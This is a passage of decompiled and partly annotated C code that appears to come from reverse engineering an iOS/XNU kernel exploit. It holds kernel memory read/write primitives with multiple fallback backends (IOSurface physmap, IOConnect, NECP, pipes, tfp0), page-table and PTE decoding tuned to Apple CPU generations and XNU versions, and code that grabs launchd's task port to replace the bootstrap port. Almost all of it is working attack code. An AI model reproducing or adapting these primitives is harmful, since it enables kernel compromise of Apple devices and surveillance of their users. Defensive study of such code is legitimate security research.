    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER)
      || (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK)
       && krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 40, 108, 0, 0)) )
      return v2 | 0xFFFF800000000000LL;
    else
      return v2 | 0xFFFFFF8000000000LL;
  }
  return v2;
}

//----- (0000000000029DF8) ----------------------------------------------------
bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 newValue, int whatIsThis)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v6)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64); // x8
  int v7; // w0
  kern_return_t v8; // w21
  __int64 v10; // x23
  semaphore_t v11; // w0
  int v12; // w21
  vm_map_t v13; // w0
  mach_vm_size_t v14; // x2
  __int64 v16; // x9
  int v17; // w8
  uint64_t *v18; // x20
  kern_return_t v19; // w0
  mach_timespec_t v20; // x1
  kern_return_t v21; // w0
  __int64 v22; // [xsp+8h] [xbp-48h] BYREF
  __int64 v23; // [xsp+10h] [xbp-40h] BYREF
  vm_machine_attribute_val_t value[2]; // [xsp+18h] [xbp-38h] BYREF

  v22 = newValue;
  v6 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64))krwCtx->iogpuKwriteFn;
  if ( v6 )
  {
    v7 = v6(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    *(uint64_t *)value = newValue;
    if ( !krwCtx->IOKitConnInfo )
    {
      v8 = 5;
      return v8 == 0;
    }
    v7 = iosurface_physmap_kwrite(krwCtx, address, (__int64)value, krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v7 = ioconnect_callmethod_write(krwCtx, address, (__int64)&v22, krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
    goto LABEL_27;
  if ( krwCtx->iosurfaceFd_size4 == -1 || !krwCtx->gap_0x218 )
  {
    if ( krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1 )
    {
      v7 = pipe_pair_krw(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
      goto LABEL_3;
    }
LABEL_27:
    v8 = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&v22, krwCtx->stride_0x168);
    v13 = krwCtx->targetVmPort;
    v14 = krwCtx->stride_0x168;
    value[0] = 7;
    mach_vm_machine_attribute(v13, address, v14, 1u, value);
    return v8 == 0;
  }
  v23 = newValue;
  if ( whatIsThis )
  {
    v7 = acquire_write_semaphore_lock(krwCtx, 1u, 0x2710u);
    if ( v7 )
      goto LABEL_3;
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
    {
      v12 = necp_ioservice_auth_write(krwCtx, address);
      goto LABEL_32;
    }
    *(uint64_t *)value = newValue;
    v10 = krwCtx->semaphoreHelperCtx;
    if ( !v10 || (v11 = *(uint32_t *)(v10 + 8), v11 + 1 < 2) )
    {
      v12 = 708609;
      goto LABEL_32;
    }
    v12 = 708609;
    if ( (unsigned int)(*(uint32_t *)(v10 + 12) + 1) >= 2 )
    {
      *(uint64_t *)(v10 + 32) = address;
      v18 = (uint64_t *)(v10 + 32);
      *(uint64_t *)(v10 + 40) = value;
      *(uint64_t *)(v10 + 48) = 8;
      v19 = semaphore_signal(v11);
      if ( v19 )
      {
        v12 = v19 | 0x80000000;
LABEL_41:
        *v18 = 0;
        *(uint64_t *)(v10 + 40) = 0;
        *(uint64_t *)(v10 + 48) = 0;
        goto LABEL_32;
      }
      v20 = IDA_MACH_TIMESPEC(3ULL);
      v21 = semaphore_timedwait(*(uint32_t *)(v10 + 12), v20);
      v12 = *(uint32_t *)(v10 + 60);
      if ( !v12 )
      {
        if ( v21 )
          v12 = v21 | 0x80000000;
        else
          v12 = 0;
        goto LABEL_41;
      }
      *v18 = 0;
      *(uint64_t *)(v10 + 40) = 0;
      *(uint64_t *)(v10 + 48) = 0;
      teardown_semaphore_helper_ctx(krwCtx, 0);
    }
LABEL_32:
    v16 = krwCtx->mappedKernelRegion;
    v17 = 708616;
    if ( v16 && krwCtx->mappedKernelSize )
    {
      v17 = 0;
      atomic_store(0, (unsigned __int8 *)(v16 + 1));
    }
    if ( v12 )
      v7 = v12;
    else
      v7 = v17;
    goto LABEL_3;
  }
  v7 = necp_ioconnect_krw(krwCtx, address, (__int64)&v23, krwCtx->stride_0x168, 1);
LABEL_3:
  if ( v7 )
    v8 = 5;
  else
    v8 = 0;
  return v8 == 0;
}

//----- (000000000002A0D0) ----------------------------------------------------
bool __fastcall kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t a2, __int64 a3)
{
  return kwrite64_last_arg(krwCtx, a2, a3, krwCtx->gap_0xC);
}

//----- (000000000002A0D8) ----------------------------------------------------
__int64 __fastcall pgtable_walk_and_physmap_remap(struct_krwCtx *krwCtx, __int64 a2, __int64 a3)
{
  int v6; // w0
  int v7; // w0
  __int64 v8; // x8
  __int64 v9; // x20
  uint8_t v11[32]; // [xsp+8h] [xbp-88h] BYREF
  __int64 v12; // [xsp+28h] [xbp-68h]
  __int128 v13[3]; // [xsp+30h] [xbp-60h] BYREF
  __int64 v14; // [xsp+60h] [xbp-30h]

  v12 = 0;
  v14 = 0;
  memset(v13, 0, sizeof(v13));
  v6 = pgtable_walk_wrapper(krwCtx, a2 & ~krwCtx->pageMask, v11);
  if ( !v6 )
    return 0;
  v7 = physmap_map_cached(krwCtx, v12 & 0xFFFFFFFFC000LL, (__int64)v13);
  v8 = *(uint64_t *)&v13[0];
  if ( v7 )
  {
    v9 = 0;
    if ( !*(uint64_t *)&v13[0] )
      return v9;
    goto LABEL_7;
  }
  *(uint64_t *)((krwCtx->pageMask & a2) + *(uint64_t *)&v13[0]) = a3;
  v9 = 1;
  if ( v8 )
LABEL_7:
    physmap_unmap_cached(krwCtx, (__int64)v13);
  return v9;
}
// 2A11C: variable 'v6' is possibly undefined

//----- (000000000002A188) ----------------------------------------------------
__int64 __fastcall kwritebuf_last_arg_1(struct_krwCtx *krwCtx, __int64 address, const void *buf, mach_vm_size_t bufSize)
{
  return noppl_kwritebuf(krwCtx, address, buf, bufSize, 1);
}

//----- (000000000002A190) ----------------------------------------------------
unsigned __int64 __fastcall port_right_index_to_kaddr(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 v2; // x19
  unsigned __int64 result; // x0
  __int64 v4; // x8
  __int64 v5; // x9
  int v6; // [xsp+Ch] [xbp-14h] BYREF

  v2 = a2;
  if ( !a2 )
    return 0;
  if ( (a2 & 0x80000000) != 0 )
  {
    v4 = krwCtx->gap_0x1F0;
    if ( v4 )
    {
      v5 = krwCtx->gap_0x1F8;
      if ( (uint32_t)v5 )
        return v4 + (a2 & 0x7FFFFFFF) * v5;
    }
    return 0;
  }
  result = kernel_va_base_resolver(krwCtx, 0, &v6);
  if ( result )
    result += v2 << v6;
  return result;
}

//----- (000000000002A200) ----------------------------------------------------
unsigned __int64 __fastcall decode_pte_to_physmap_addr(struct_krwCtx *krwCtx, unsigned __int64 a2, uint32_t *a3)
{
  bool v6; // cc
  int v7; // w9
  unsigned __int64 v8; // x8
  unsigned __int64 v9; // x11
  char v10; // w12
  __int64 v11; // x10
  __int64 v12; // x13
  __int64 v13; // x13
  __int64 v14; // x12
  __int64 v15; // x12
  __int64 v16; // x9
  unsigned __int64 v17; // x8

  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK) )
    {
      v6 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
      v7 = v6;
      v8 = 0xFFFF9FFFFFFFFFF0LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
        v8 = -32;
      v9 = 0xFFFFBFFFFFFFC000LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
      {
        v10 = 46;
      }
      else
      {
        v9 = 0xFFFF9FFFFFFFC000LL;
        v10 = 45;
      }
      v11 = 0x600000000000LL;
      v12 = 0x400000000000LL;
    }
    else
    {
      v6 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
      v7 = v6;
      v8 = 0xFFFFFF9FFFFFFFF0LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
        v8 = -32;
      v9 = 0xFFFFFFBFFFFFC000LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
      {
        v10 = 38;
      }
      else
      {
        v9 = 0xFFFFFF9FFFFFC000LL;
        v10 = 37;
      }
      v11 = 0x6000000000LL;
      v12 = 0x4000000000LL;
    }
    if ( v6 )
      v11 = v12;
    v13 = 3;
    if ( v7 )
      v13 = 1;
    v14 = v13 & (a2 >> v10);
    if ( v14 )
    {
      v15 = v14 << (a2 & 0xF);
      if ( v7 )
        v16 = ((a2 & 0x10) | 0x20) << (a2 & 0xF);
      else
        LODWORD(v16) = v15;
    }
    else
    {
      LODWORD(v16) = ((uint32_t)a2 << 14) & 0xFFFC000;
      v8 = v9;
    }
    *a3 = v16;
    return (v8 & a2) | v11;
  }
  else
  {
    v17 = HIWORD(a2);
    if ( (a2 & 0x800000000000LL) != 0 )
      LODWORD(v17) = HIWORD(a2) << 14;
    *a3 = v17;
    return a2 | 0xFFFF800000000000LL;
  }
}

//----- (000000000002A360) ----------------------------------------------------
bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr, mach_vm_size_t size, void *outBuf, __int64 a5)
{
  __int64 (__fastcall *v5)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64); // x9
  int v6; // w0
  int v7; // w0

  v5 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64))&krwCtx->iogpuKreadFn;
  if ( v5 )
  {
    v6 = v5(krwCtx, vaddr, outBuf, size, a5);
    goto LABEL_3;
  }
  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    v6 = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
         && *(uint64_t *)&krwCtx->ioConnectMappedAddr
         && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    v6 = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
    {
      v6 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, size, a5);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v7 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, vaddr, size, (unsigned int)krwCtx->vmMapSize, (__int64)outBuf, 0);
      return v7 == 0;
    }
    v6 = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, size, a5);
  }
LABEL_3:
  if ( v6 )
    v7 = 5;
  else
    v7 = 0;
  return v7 == 0;
}

//----- (000000000002A480) ----------------------------------------------------
bool __fastcall kreadbuf_0(__int64 krwCtx, unsigned __int64 addr, mach_vm_size_t size, void *outBuf)
{
  return kreadbuf_universal(KRWCTX_FROM_UINTPTR(krwCtx), addr, size, outBuf, 0);
}

//----- (000000000002A488) ----------------------------------------------------
bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4, int a5)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v5)(__int64, unsigned __int64, const void *, mach_vm_size_t, int); // x8
  int v6; // w0
  int v7; // w0

  TRACE_PORTS("noppl_kwritebuf enter ctx=%llx addr=%llx buf=%llx size=%llx a5=%d fn=%llx sptm_fd=%d sptm_ctx=%llx shm_port=%d shm_u=%llx shm_k=%llx necp_r=%d necp_w=%d pipe0=%d pipe1=%d iosurface_fd=%d necp=%llx tfp=%d chunk=%u\n",
              (unsigned long long)a1,
              (unsigned long long)a2,
              (unsigned long long)a3,
              (unsigned long long)a4,
              a5,
              (unsigned long long)krwCtx->iogpuKwriteFn,
              krwCtx->threadForKernelRead,
              (unsigned long long)krwCtx->threadStateKrwPhysAddr,
              krwCtx->ioConnectPort,
              (unsigned long long)krwCtx->ioConnectMappedAddr,
              (unsigned long long)krwCtx->ioConnectMappedSize,
              krwCtx->krw_pipe_0,
              krwCtx->krw_pipe_1,
              krwCtx->pipeFd0,
              krwCtx->pipeFd1,
              krwCtx->iosurfaceFd_size4,
              (unsigned long long)krwCtx->gap_0x218,
              krwCtx->targetVmPort,
              krwCtx->vmMapSize_size4);
  v5 = (__int64 (__fastcall *)(__int64, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->iogpuKwriteFn;
  if ( v5 )
  {
    v6 = v5(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=custom raw=%x\n", v6);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    v6 = iosurface_physmap_kwrite(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", v6);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v6 = ioconnect_callmethod_write(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=ioconnect raw=%x\n", v6);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd_size4 != -1 && krwCtx->gap_0x218 )
    {
      v6 = necp_ioconnect_krw(krwCtx, a2, (__int64)a3, a4, a5);
      TRACE_PORTS("noppl_kwritebuf backend=necp raw=%x\n", v6);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v7 = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->vmMapSize_size4);
      TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", v7, v7 == 0);
      return v7 == 0;
    }
    v6 = pipe_pair_krw(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=pipe raw=%x\n", v6);
  }
LABEL_3:
  if ( v6 )
    v7 = 5;
  else
    v7 = 0;
  TRACE_PORTS("noppl_kwritebuf exit raw=%x ok=%d\n", v6, v7 == 0);
  return v7 == 0;
}

//----- (000000000002A56C) ----------------------------------------------------
bool __fastcall kwritebuf_last_0(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4)
{
  return noppl_kwritebuf(krwCtx, a2, a3, a4, 0);
}

//----- (000000000002A574) ----------------------------------------------------
mach_vm_address_t __fastcall ppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t a2, int a3)
{
  unsigned __int64 v4; // x21
  struct_krwCtx *v5; // x19
  mach_vm_address_t result; // x0
  int newBytes; // [xsp+Ch] [xbp-24h] BYREF

  v4 = a2;
  v5 = krwCtx;
  newBytes = a3;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
LABEL_8:
    return noppl_kwrite32(krwCtx, a2, a3);
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    return ppl_kwritebuf(v5, v4, &newBytes, 4);
  result = remap_kaddr_through_physmap(v5, v4);
  if ( result )
  {
    a2 = result;
    goto LABEL_8;
  }
  return result;
}

//----- (000000000002A63C) ----------------------------------------------------
int kwrite64_dispatch(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 new_value)
{
    // Version threshold: XNU_VERSION_PACKED(8019, 60, 40, 0, 0)
    // = 0x001F530F02800000
    if (krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0)) {

        // New path: check for specific CPU/capability flag 0x05184001
        if (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK)) {
            // Tail call — PAC-authenticated branch to ppl_kwrite_physmap_checked
            return ppl_kwrite_physmap_checked(krwCtx, address, new_value);
        }

        // Translate address via remap_kaddr_through_physmap
        uint64_t translated = remap_kaddr_through_physmap(krwCtx, address);
        if (!translated)
            return 0;  // retab with no value set → returns 0

        // Use translated address, fall through to kwrite64_last_arg
        address = translated;
        // fall through

    }

    // Old path (and new path fallthrough):
    // ldrb w3, [x20, #0xc]  →  4th arg = krwCtx->byte_0x0c
    uint8_t arg3 = krwCtx->gap_0xC;

    // Tail call
    return kwrite64_last_arg(krwCtx, address, new_value, arg3);
}
// 2A6A4: variable 'vars8' is possibly undefined

//----- (000000000002A714) ----------------------------------------------------
unsigned __int64 __fastcall kwritebuf_universal(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        const void *newBytes,
        mach_vm_size_t length)
{
  unsigned __int64 vaddr_; // x22
  struct_krwCtx *krwCtx_; // x21
  unsigned __int64 result; // x0

  vaddr_ = vaddr;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      return ppl_kwritebuf(krwCtx, vaddr_, (void *)newBytes, length);
    }
    result = remap_kaddr_through_physmap(krwCtx, vaddr_);
    if ( !result )
      return result;
    vaddr = result;
  }
  return noppl_kwritebuf(krwCtx, vaddr, newBytes, length, 1);
}
// 2A784: variable 'vars8' is possibly undefined

//----- (000000000002A7F4) ----------------------------------------------------
__int64 __fastcall mach_vm_read_with_attr_chunks(
        vm_map_t target_task,
        mach_vm_address_t address,
        __int64 a3,
        mach_vm_size_t size,
        unsigned int a5)
{
  unsigned int v5; // w21
  unsigned int v8; // w24
  __int64 v10; // x25
  unsigned int v11; // w26
  mach_msg_type_number_t v12; // w23
  __int64 result; // x0
  vm_machine_attribute_val_t value; // [xsp+Ch] [xbp-44h] BYREF

  v5 = size;
  if ( a5 )
    v8 = a5;
  else
    v8 = size;
  if ( (uint32_t)size )
  {
    v10 = 0;
    v11 = size;
    while ( 1 )
    {
      v12 = v11 >= v8 ? v8 : v11;
      result = mach_vm_write(target_task, v10 + address, v10 + a3, v12);
      if ( (uint32_t)result )
        break;
      v10 += v12;
      v11 -= v12;
      if ( !v11 )
        goto LABEL_11;
    }
  }
  else
  {
LABEL_11:
    value = 7;
    mach_vm_machine_attribute(target_task, address, v5, 1u, &value);
    return 0;
  }
  return result;
}

//----- (000000000002A8A4) ----------------------------------------------------
__int64 __fastcall pgtable_write_aligned(struct_krwCtx *krwCtx)
{
  __int64 v1; // x19
  kern_return_t v3; // w0
  __int64 v5; // x21
  unsigned __int64 v6; // x23
  __int128 v7; // q0
  mach_port_name_t iin_name; // w1
  kern_return_t attributes; // w0
  mach_port_name_t v10; // w2
  unsigned __int64 v11; // x0
  kern_return_t v12; // w0
  mach_msg_type_number_t port_info_outCnt; // [xsp+Ch] [xbp-B4h] BYREF
  integer_t port_info_out[4]; // [xsp+10h] [xbp-B0h] BYREF
  __int128 v15; // [xsp+20h] [xbp-A0h]
  __int128 v16; // [xsp+30h] [xbp-90h]
  __int128 v17; // [xsp+40h] [xbp-80h]
  int v18; // [xsp+50h] [xbp-70h]
  mach_msg_type_number_t tree_infoCnt; // [xsp+54h] [xbp-6Ch] BYREF
  ipc_info_tree_name_array_t tree_info; // [xsp+58h] [xbp-68h] BYREF
  mach_msg_type_number_t table_infoCnt; // [xsp+64h] [xbp-5Ch] BYREF
  ipc_info_name_array_t table_info; // [xsp+68h] [xbp-58h] BYREF
  ipc_info_space_t space_info; // [xsp+70h] [xbp-50h] BYREF
  mach_port_name_t v24; // [xsp+8Ch] [xbp-34h] BYREF

  if ( !krwCtx )
    return 708609;
  if ( bootstrap_port + 1 > 1 )
    return 0;
  v1 = 163843;
  v24 = 0;
  if ( krw_task_for_pid(krwCtx, 1, &v24) )
  {
    memset(&space_info, 0, sizeof(space_info));
    table_info = 0;
    table_infoCnt = 0;
    tree_info = 0;
    tree_infoCnt = 0;
    v3 = mach_port_space_info(v24, &space_info, &table_info, &table_infoCnt, &tree_info, &tree_infoCnt);
    if ( v3 )
    {
      v1 = v3 | 0x80000000;
    }
    else if ( table_infoCnt )
    {
      v5 = 0;
      v6 = 0;
      v7 = 0u;
      while ( 1 )
      {
        v18 = 0;
        v16 = v7;
        v17 = v7;
        *(__int128 *)port_info_out = v7;
        v15 = v7;
        port_info_outCnt = 17;
        if ( (table_info[v5].iin_type & 0x1F0000) != 0 )
        {
          iin_name = table_info[v5].iin_name;
          if ( iin_name + 1 >= 2 )
          {
            attributes = mach_port_get_attributes(v24, iin_name, 7, port_info_out, &port_info_outCnt);
            v7 = 0u;
            if ( !attributes && port_info_out[3] == 128 && (~BYTE4(v16) & 6) == 0 )
              break;
          }
        }
        ++v6;
        ++v5;
        if ( v6 >= table_infoCnt )
          goto LABEL_8;
      }
      v10 = table_info[v5].iin_name;
      if ( v10 + 1 >= 2 )
      {
        v11 = task_get_ipc_port(krwCtx, v24, v10);
        if ( v11 )
        {
          v1 = plist_elem_is_string_6(krwCtx, v11, &bootstrap_port);
          if ( !(uint32_t)v1 )
          {
            v12 = task_set_special_port(mach_task_self_, 4, bootstrap_port);
            if ( v12 )
              v1 = v12 | 0x80000000;
            else
              v1 = 0;
          }
        }
      }
    }
LABEL_8:
    if ( table_info && table_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)table_info, 28LL * table_infoCnt);
    if ( tree_info && tree_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)tree_info, 36LL * tree_infoCnt);
    mach_port_deallocate(mach_task_self_, v24);
  }
  return v1;
}

//----- (000000000002AABC) ----------------------------------------------------
__int64 __fastcall semaphore_timedwait_ns(__int64 a1, unsigned int a2)
{
  mach_timespec_t v2; // x1

  v2 = IDA_MACH_TIMESPEC((a2 / 0xF4240uLL) & 0x7FFFFFFFFLL
                       | ((unsigned __int64)((125 * (a2 % 0xF4240)) & 0x1FFFFFFF) << 35));
  if ( semaphore_timedwait(*(uint32_t *)(a1 + 612), v2) == 49 )
    return 0;
  else
    return 0xFFFFFFFFLL;
}

//----- (000000000002AB10) ----------------------------------------------------
__int64 vtable_trampoline_b()
{
  return 0LL;
}

